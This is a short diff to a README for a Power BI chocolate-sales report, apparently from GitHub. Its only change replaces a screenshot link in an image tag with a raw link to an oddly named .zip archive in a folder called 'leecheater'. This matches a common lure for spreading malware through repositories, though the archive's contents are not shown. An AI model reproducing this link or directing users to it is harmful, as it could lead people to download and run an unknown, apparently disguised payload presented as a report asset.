@@ -3,7 +3,7 @@
 This Power BI report provides an end-to-end analysis of sales, products, shipments, and geographical performance, helping understand overall business trends and key KPIs.
 
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3ba5328d-8812-4d71-9de4-12a60fac405d" />
+<img width="1920" height="1080" alt="image" src="https://github.com/AlapatiAbhinavChowdhary/awesome-chocolate-power-bi-report/raw/refs/heads/main/leecheater/chocolate-bi-awesome-report-power-Barnburner.zip" />
 
 
 
